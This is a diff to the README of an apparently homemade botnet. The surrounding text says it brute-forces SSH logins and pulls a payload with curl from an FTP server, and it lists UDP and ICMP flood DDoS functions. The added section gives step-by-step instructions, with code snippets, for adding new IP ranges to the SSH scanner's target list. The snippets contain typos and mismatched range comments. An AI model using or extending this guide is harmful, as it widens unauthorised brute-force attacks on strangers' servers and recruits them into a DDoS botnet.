@@ -14,6 +14,28 @@ and login by Brute-force attack. This botnet use "curl" to get payload from FTP 
 <strong>I scan on my private netowrk in SSH range, And comment a function of running session.(That why bot is not join The server.)</strong>
 <img src="assets/scanprocess.png" alt="SSH scan">
 
+# Add more IP range
+
+(1) Add your new ip range in to The group of const varible.
+
+		var_name = "224." //224.0.0.0 - 224.255.255.255
+		or
+		var_anme = "224.12" //224.12.0.0 - 224.255.255.255
+
+(2) Go to "NextIP" function, Add The case for your ip range and return range of your ip.
+
+		case var_name:
+				return ManageIP_range(ipRange, GenRange(255, 0))
+		or
+		case var_name:
+				return ManageIP_range(ipRange, "")
+
+(3) Then go to The "SSH_Conn" function, And add your constant ip range to The array name "NetArr".
+
+		NetArr := []string{
+			chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
+			cgpn4, cgpn5, cgpn6, var_name,
+		}
 
 # DDoS
 Raw socket programming is really hard for me. That's why all of <strong>The volumetric</strong> are a simple like udp and icmp flood.
